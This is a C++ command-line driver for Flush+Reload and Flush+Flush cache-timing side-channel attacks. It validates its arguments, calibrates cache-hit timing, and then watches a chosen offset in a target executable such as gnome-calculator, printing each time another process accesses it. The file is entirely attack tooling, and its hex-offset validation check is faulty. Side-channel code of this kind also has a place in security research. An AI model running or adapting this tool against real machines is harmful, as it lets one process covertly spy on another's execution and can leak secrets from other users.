#include <sstream>
#include <tuple>
#include <memory>

#include <stdio.h>
#include <unistd.h>
#include <ctype.h>
#include <string.h>

#include "../flush_flush/flush_flush.hpp"
#include "../flush_reload/flush_reload.hpp"
#include "../flush_calibrator/flush_calibrator.hpp"

#define USAGE "USAGE: flush-cli ff,fr executable offset sensibility\nExample: flush-cli fr /usr/bin/gnome-calculator 0xa3e0 1.0\n" \
"sensibility: a value between 0.0 and 1.0 which is the minimum allowed chance of being a hit per timestamp"

using CTA=CacheTimingAttack;

bool all_xdigits(char* str){

	for(; *str!='\0'; str++)

		if( !isxdigit(*str) ) return false;

	return true;
}

bool validate_arguments(unsigned int argc, char** argv){

	if( argc == 5 ){

		if( strncmp(argv[1], "ff", 3) && strncmp(argv[1], "fr", 3) ){

			printf("attack type can only be 'ff' (Flush+Flush) or 'fr' (Flush+Reload)\n");
			return false;
		}

		if( access( argv[2], R_OK ) == -1 ){

			printf("can't read file\n");
			return false;
		}

		if( strlen(argv[3]) <= 2 && argv[3][0] != '0' && argv[3][1] != 'x' && all_xdigits( &argv[3][2] ) ){

			printf("third argument must be an hexadecimal number\n");
			return false;
		}

		double test;
		if( !sscanf(argv[4],"%lf", &test) || test > 1.0 || test < 0.0 ){

			printf("invalid sensibility\n");
			return false;
		}

	} else {

		printf("Wrong number of argumnets\n");
		return false;
	}

	return true;
}

std::tuple<std::string, std::string, unsigned int, double> transform_arguments(unsigned int argc, char** argv){

	std::string attack_type = argv[1];
	std::string executable_path = argv[2];

	unsigned int offset;
	sscanf(argv[3], "%x", &offset);

	double sensibility;
	sscanf(argv[4], "%lf", &sensibility);

	printf("sensibility: %lf\n", sensibility);

	return { attack_type, executable_path, offset, sensibility };
}

std::unique_ptr<CTA> prepare_attack(std::string attack_type, std::string exec, unsigned int offset){

	std::unique_ptr<CTA> attack;

	if( attack_type == std::string("fr") ){

		printf("FlushReload choosen\n");	
		attack = std::make_unique<FlushReload>(exec.c_str(), offset);
	} else {

		printf("FlushFlush choosen\n");
		attack = std::make_unique<FlushFlush>(exec.c_str(), offset);
	}

	return std::move(attack);
}

unsigned int i=0;
unsigned int sum=0;

bool notify_access(unsigned int time, unsigned int misses){


	printf("offset accessed! time for access: %u, misses: %u\n", time, misses);

	return true;
}

int main(int argc, char** argv){

	if( !validate_arguments(argc, argv) ){

		printf(USAGE);
		return 1;
	}

	auto [ attack_type, executable, offset, sensibility ] = transform_arguments(argc, argv);

	std::unique_ptr<CTA> attack = prepare_attack(attack_type, executable, offset);

	FlushCalibrator calibrator = FlushCalibrator();
	
	printf("CALIBRATING. This can take a minute or two...\n");
	calibrator.calibrate(*attack, "test.csv", sensibility=sensibility);

	printf("hit range: (%u,%u)\n", attack->hit_begin, attack->hit_end);
	printf("waiting for an access in '%s' at offset 0x%x...\n", executable.c_str(), offset);
	attack->call_when_offset_is_accessed(notify_access);

	return 0;
}
